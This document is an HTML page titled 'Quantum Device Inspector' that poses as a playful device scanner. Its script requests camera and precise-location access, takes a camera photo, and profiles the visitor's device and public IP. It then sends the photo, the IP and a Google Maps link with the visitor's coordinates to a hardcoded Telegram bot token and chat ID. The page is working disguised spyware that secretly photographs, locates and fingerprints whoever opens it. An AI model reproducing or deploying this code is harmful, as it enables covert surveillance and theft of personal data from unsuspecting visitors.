<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>Quantum Device Inspector</title>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https: 'unsafe-inline' 'unsafe-eval';">
  <style>
    :root {
      --primary: #2ecc71;
      --secondary: #3498db;
      --error: #e74c3c;
    }
    
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: #0a0a0a;
      color: white;
      min-height: 100dvh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 1rem;
      margin: 0;
    }

    .scanner-container {
      position: relative;
      width: min(90vw, 400px);
      aspect-ratio: 1;
      border-radius: 1.5rem;
      overflow: hidden;
      box-shadow: 0 0 2rem rgba(46, 204, 113, 0.2);
      margin: 2rem 0;
    }

    #video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
    }

    .scan-overlay {
      position: absolute;
      inset: 0;
      border: 0.25rem solid var(--primary);
      border-radius: 1.5rem;
      pointer-events: none;
    }

    .scan-line {
      position: absolute;
      width: 100%;
      height: 0.25rem;
      background: linear-gradient(to bottom, transparent, var(--primary), transparent);
      animation: scan 3s cubic-bezier(0.65, 0.05, 0.36, 1) infinite;
    }

    @keyframes scan {
      0% { top: 0; opacity: 0; }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { top: 100%; opacity: 0; }
    }

    button {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      border: none;
      color: white;
      padding: 1rem 2rem;
      border-radius: 2rem;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.2s, opacity 0.2s;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      backdrop-filter: blur(10px);
      margin: 1rem;
    }

    button:active {
      transform: scale(0.95);
    }

    button:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    .toast {
      position: fixed;
      bottom: 2rem;
      background: rgba(0,0,0,0.9);
      padding: 1rem 2rem;
      border-radius: 0.5rem;
      border-left: 0.5rem solid var(--primary);
      backdrop-filter: blur(10px);
      display: none;
    }

    .device-info {
      background: rgba(255,255,255,0.05);
      border-radius: 1rem;
      padding: 1.5rem;
      margin: 1rem;
      width: min(90vw, 600px);
      display: none;
    }

    .info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 1rem;
      margin: 1rem 0;
    }

    .info-item {
      background: rgba(0,0,0,0.3);
      padding: 1rem;
      border-radius: 0.5rem;
      border: 1px solid rgba(255,255,255,0.1);
    }

    @media (max-width: 480px) {
      .scanner-container {
        width: 85vw;
      }
      
      button {
        width: 100%;
        justify-content: center;
      }
    }
  </style>
</head>
<body>
  <h1>üõ∏ Quantum Device Inspector</h1>
  
  <div class="scanner-container">
    <video id="video" playsinline muted></video>
    <div class="scan-overlay">
      <div class="scan-line"></div>
    </div>
  </div>

  <button id="scanBtn" onclick="startQuantumScan()">
    <span class="btn-icon">üöÄ</span>
    <span class="btn-text">Start Full Scan</span>
  </button>

  <div class="device-info" id="deviceInfo"></div>
  <div class="toast" id="toast"></div>

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    let mediaStream = null;

    // Toast Notification System
    const toast = {
      show: (message, type = 'info', duration = 3000) => {
        const toastEl = document.getElementById('toast');
        toastEl.style.display = 'block';
        toastEl.textContent = message;
        toastEl.style.borderColor = `var(--${type})`;
        setTimeout(() => {
          toastEl.style.display = 'none';
        }, duration);
      },
      error: (message) => toast.show(message, 'error', 5000)
    };

    // Enhanced Permissions Handler
    async function requestPermissions() {
      try {
        const cameraPerm = await navigator.permissions.query({ name: 'camera' });
        const locationPerm = await navigator.permissions.query({ name: 'geolocation' });
        if (cameraPerm.state === 'denied' || locationPerm.state === 'denied') {
          toast.error('Please enable camera and location permissions');
          return false;
        }
        return true;
      } catch (error) {
        console.error('Permission API error:', error);
        return true;
      }
    }

    // Modern Camera Initialization
    async function initCamera() {
      try {
        if (!navigator.mediaDevices?.getUserMedia) {
          throw new Error('Camera API not supported');
        }
        // Hentikan stream lama jika ada
        mediaStream?.getTracks().forEach(track => track.stop());
        
        const constraints = {
          video: {
            facingMode: { ideal: 'environment' },
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          }
        };
        mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
        const video = document.getElementById('video');
        video.srcObject = mediaStream;
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });
      } catch (error) {
        toast.error(`Camera Error: ${error.message}`);
        throw error;
      }
    }

    // Hybrid Location Acquisition dengan watchPosition dan timeout
    async function getDeviceLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          return reject(new Error('Geolocation not supported'));
        }
        const options = {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        };
        const watchId = navigator.geolocation.watchPosition(
          position => {
            if (position.coords.accuracy <= 50) {
              navigator.geolocation.clearWatch(watchId);
              resolve(position);
            }
          },
          error => {
            navigator.geolocation.clearWatch(watchId);
            reject(error);
          },
          options
        );
        // Pastikan jika tidak mendapatkan posisi dalam 30 detik, maka timeout
        setTimeout(() => {
          navigator.geolocation.clearWatch(watchId);
          reject(new Error('Location request timed out'));
        }, 30000);
      });
    }

    // Comprehensive Device Profiling
    async function getDeviceProfile() {
      const [connection, battery, gpu] = await Promise.all([
        navigator.connection || navigator.mozConnection,
        navigator.getBattery?.() || Promise.resolve(null),
        getGPUInfo()
      ]);
      return {
        platform: {
          os: getOS(),
          browser: getBrowser(),
          architecture: navigator.userAgentData?.platform || 'N/A',
          ram: `${navigator.deviceMemory || 'Unknown'}GB`,
          cores: navigator.hardwareConcurrency || 'Unknown'
        },
        network: {
          type: connection?.effectiveType || 'Unknown',
          ip: await getPublicIP(),
          speed: connection?.downlink ? `${connection.downlink}Mbps` : 'Unknown'
        },
        power: {
          battery: battery?.level ? `${Math.round(battery.level * 100)}%` : 'N/A',
          charging: battery?.charging ? 'Yes' : 'No'
        },
        display: {
          resolution: `${screen.width}x${screen.height}`,
          density: window.devicePixelRatio,
          orientation: screen.orientation?.type.replace('-primary', '') || 'Portrait'
        },
        gpu: gpu
      };
    }

    // GPU Detection with Fallback
    async function getGPUInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
        const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? {
          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        } : 'Not available';
      } catch {
        return 'Unable to detect';
      }
    }

    // Frame Capture Handler
    async function captureFrame() {
      const video = document.getElementById('video');
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      return new Promise((resolve, reject) => {
        canvas.toBlob(blob => {
          if (blob) {
            resolve(new File([blob], 'scan.jpg', { type: 'image/jpeg' }));
          } else {
            reject(new Error('Failed to capture frame'));
          }
        }, 'image/jpeg', 0.85);
      });
    }

    // Telegram Reporting
    async function sendTelegramReport(photoFile, device, location) {
      const formData = new FormData();
      const mapsLink = `https://www.google.com/maps?q=${location.coords.latitude},${location.coords.longitude}`;
      const caption = `üì° *Quantum Scan Report*\n\n` +
                      `üïí ${new Date().toLocaleString()}\n\n` +
                      `üíª *Platform*\nOS: ${device.platform.os}\nArch: ${device.platform.architecture}\n\n` +
                      `üåê *Network*\nType: ${device.network.type}\nIP: ${device.network.ip}\n\n` +
                      `üìç *Location*\nAccuracy: ${Math.round(location.coords.accuracy)}m\n${mapsLink}`;
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', photoFile);
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');
      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        console.log('Telegram response:', result);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
      } catch (error) {
        throw new Error(`Telegram API: ${error.message}`);
      }
    }

    // Main Scanning Procedure
    async function startQuantumScan() {
      const scanBtn = document.getElementById('scanBtn');
      scanBtn.disabled = true;
      scanBtn.querySelector('.btn-text').textContent = 'Scanning...';
      try {
        const permissionsGranted = await requestPermissions();
        if (!permissionsGranted) throw new Error('Permissions not granted');
        await initCamera();
        // Dapatkan device profile, lokasi dan pastikan delay minimal 2 detik
        const [deviceProfile, location] = await Promise.all([
          getDeviceProfile(),
          getDeviceLocation(),
          new Promise(resolve => setTimeout(resolve, 2000))
        ]);
        const photo = await captureFrame();
        await sendTelegramReport(photo, deviceProfile, location);
        displayDeviceInfo(deviceProfile, location);
        toast.show('Scan complete! Report sent', 'success');
      } catch (error) {
        toast.error(`Scan failed: ${error.message}`);
        console.error('Error during scan:', error);
      } finally {
        scanBtn.disabled = false;
        scanBtn.querySelector('.btn-text').textContent = 'Start Full Scan';
      }
    }

    // Utility Functions
    function getOS() {
      const ua = navigator.userAgent;
      return /Android/i.test(ua) ? 'Android' :
             /iPhone|iPad|iPod/i.test(ua) ? 'iOS' :
             /Win/i.test(ua) ? 'Windows' :
             /Mac/i.test(ua) ? 'macOS' :
             /Linux/i.test(ua) ? 'Linux' : 'Unknown';
    }

    function getBrowser() {
      const ua = navigator.userAgent;
      return /Edg/i.test(ua) ? 'Edge' :
             /OPR/i.test(ua) ? 'Opera' :
             /Chrome/i.test(ua) ? 'Chrome' :
             /Firefox/i.test(ua) ? 'Firefox' :
             /Safari/i.test(ua) ? 'Safari' : 'Unknown';
    }

    async function getPublicIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch {
        return 'N/A';
      }
    }

    function displayDeviceInfo(device, location) {
      const infoContainer = document.getElementById('deviceInfo');
      infoContainer.style.display = 'block';
      infoContainer.innerHTML = `
        <h3>Device Profile</h3>
        <div class="info-grid">
          <div class="info-item">
            <div>üñ• Operating System</div>
            <div>${device.platform.os}</div>
          </div>
          <div class="info-item">
            <div>üßÆ CPU Cores</div>
            <div>${device.platform.cores}</div>
          </div>
          <div class="info-item">
            <div>üíæ System Memory</div>
            <div>${device.platform.ram}</div>
          </div>
          <div class="info-item">
            <div>üéÆ GPU Renderer</div>
            <div>${device.gpu.renderer || 'N/A'}</div>
          </div>
        </div>
        
        <h3>Location Data</h3>
        <div class="info-grid">
          <div class="info-item">
            <div>üåç Latitude</div>
            <div>${location.coords.latitude.toFixed(6)}</div>
          </div>
          <div class="info-item">
            <div>üåé Longitude</div>
            <div>${location.coords.longitude.toFixed(6)}</div>
          </div>
          <div class="info-item">
            <div>üéØ Accuracy</div>
            <div>${Math.round(location.coords.accuracy)} meters</div>
          </div>
        </div>
      `;
    }

    // Initialization
    (async function init() {
      try {
        await requestPermissions();
        document.getElementById('scanBtn').disabled = false;
      } catch (error) {
        toast.error('Initialization failed');
      }
    })();
  </script>
</body>
</html>
